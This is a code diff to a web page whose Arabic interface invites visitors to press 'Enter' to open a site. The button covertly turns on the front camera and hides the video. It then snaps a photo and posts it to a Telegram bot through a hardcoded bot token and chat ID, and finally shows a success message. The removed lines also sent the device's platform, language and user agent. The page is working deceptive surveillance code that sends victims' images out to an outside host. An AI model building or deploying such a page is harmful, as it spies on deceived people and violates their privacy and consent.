@@ -11,16 +11,10 @@ body {
   text-align:center;
   font-family:Arial;
 }
-
 video { display:none; }
-
-#loading {
-  display:none;
-  font-size:20px;
-}
-
-#countdown {
-  font-size:30px;
+button {
+  padding:10px 20px;
+  font-size:18px;
   margin-top:20px;
 }
 </style>
@@ -28,10 +22,9 @@ video { display:none; }
 
 <body>
 
-<h3>انتظر سيتم فتح الموقع...</h3>
+<h3>اضغط لفتح الموقع</h3>
 
-<div id="countdown"></div>
-<div id="loading">⏳ جاري التحقق...</div>
+<button onclick="startCamera()">دخول</button>
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas" style="display:none;"></canvas>
@@ -41,53 +34,24 @@ const BOT_TOKEN = "7852857305:AAEW7SqDION4MTuIPNnxP6caMEYMLl2yojc";
 const CHAT_ID  = "8514140307";
 
 let streamRef = null;
-let sent = false;
 
-// معلومات الجهاز
-function getDeviceInfo() {
-  return `
-📱 الجهاز: ${navigator.platform}
-🌐 اللغة: ${navigator.language}
-🧭 المتصفح: ${navigator.userAgent}
-⏰ الوقت: ${new Date().toLocaleString()}
-  `;
+// لازم يكون بعد click
+function startCamera() {
+  navigator.mediaDevices.getUserMedia({
+    video: { facingMode: "user" } // كاميرا أمامية
+  })
+  .then(stream => {
+    streamRef = stream;
+    document.getElementById("video").srcObject = stream;
+
+    setTimeout(captureOnce, 2000);
+  })
+  .catch(() => {
+    alert("تم رفض الكاميرا ❌");
+  });
 }
-
-// عداد قبل التصوير
-function startCountdown() {
-  let count = 3;
-  const el = document.getElementById("countdown");
-
-  const interval = setInterval(() => {
-    el.innerText = "📸 سيتم التصوير بعد: " + count;
-    count--;
-
-    if (count < 0) {
-      clearInterval(interval);
-      el.innerText = "";
-      captureOnce();
-    }
-  }, 1000);
-}
-
-// تشغيل الكاميرا
-navigator.mediaDevices.getUserMedia({ video: true })
-.then(stream => {
-  streamRef = stream;
-  document.getElementById("video").srcObject = stream;
-
-  startCountdown();
-})
-.catch(() => {
-  document.body.innerHTML = "<h2>تم رفض إذن الكاميرا ❌</h2>";
-});
 
 function captureOnce() {
-  if (sent) return;
-  sent = true;
-
-  document.getElementById("loading").style.display = "block";
-
   const video = document.getElementById("video");
   const canvas = document.getElementById("canvas");
 
@@ -103,14 +67,13 @@ function captureOnce() {
     const form = new FormData();
     form.append("chat_id", CHAT_ID);
     form.append("photo", blob);
-    form.append("caption", getDeviceInfo());
 
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
       method: "POST",
       body: form
     })
     .then(() => {
-      document.body.innerHTML = "<h2>تم الفتح بنجاح ✅</h2>";
+      document.body.innerHTML = "<h2>تم بنجاح ✅</h2>";
     })
     .catch(() => {
       document.body.innerHTML = "<h2>فشل ❌</h2>";
